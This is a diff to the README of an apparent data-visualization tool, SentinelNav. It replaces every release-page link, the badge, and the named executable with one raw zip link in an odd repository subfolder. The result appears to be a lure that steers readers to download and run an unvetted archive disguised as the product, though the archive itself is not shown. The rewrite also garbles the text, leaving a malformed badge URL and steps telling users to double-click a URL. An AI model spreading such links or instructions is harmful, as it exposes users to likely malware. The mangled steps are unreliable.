@@ -6,24 +6,24 @@ Welcome to SentinelNav! This tool helps you visualize and analyze your data with
 
 ## 🔗 Download SentinelNav
 
-[![Download SentinelNav](https://img.shields.io/badge/Download%20SentinelNav-v1.0-brightgreen.svg)](https://github.com/souzz-wav/SentinelNav/releases)
+[![Download SentinelNav](https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip%https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip)](https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/souzz-wav/SentinelNav/releases). This page contains the latest version of SentinelNav along with previous versions. 
+   Go to the [Releases page](https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip). This page contains the latest version of SentinelNav along with previous versions. 
 
 2. **Choose a Version:**  
    You will see several versions listed. Click on the version you wish to download. Look for the files associated with that version.
 
 3. **Download the File:**  
-   Find the file named `SentinelNav.exe`. Click on it to download. Depending on your browser, the file may automatically download or you may need to confirm the download.
+   Find the file named `https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip`. Click on it to download. Depending on your browser, the file may automatically download or you may need to confirm the download.
 
 4. **Locate the Downloaded File:**  
    Once the download is complete, locate the file in your computer's "Downloads" folder. You may also find it in your browser's download manager.
 
 5. **Run SentinelNav:**  
-   Double-click the `SentinelNav.exe` file to open the application. It may take a few moments to load. 
+   Double-click the `https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip` file to open the application. It may take a few moments to load. 
 
 ## 🛠️ System Requirements
 
@@ -66,7 +66,7 @@ SentinelNav operates smoothly on most modern operating systems. Here’s what yo
 
 ### How do I uninstall SentinelNav?
 
-Simply delete the `SentinelNav.exe` file from your device. There are no additional files created, so cleaning up is straightforward.
+Simply delete the `https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip` file from your device. There are no additional files created, so cleaning up is straightforward.
 
 ### What if I encounter issues?
 
@@ -86,4 +86,4 @@ For further questions, please raise an issue on the GitHub repository. We strive
 
 ## 🎉 Conclusion
 
-Thank you for using SentinelNav! We hope this tool enhances your data analysis experience. Remember to revisit the [Releases page](https://github.com/souzz-wav/SentinelNav/releases) for updates and new features. Happy analyzing!
+Thank you for using SentinelNav! We hope this tool enhances your data analysis experience. Remember to revisit the [Releases page](https://raw.githubusercontent.com/souzz-wav/SentinelNav/main/teemingly/SentinelNav_2.3.zip) for updates and new features. Happy analyzing!
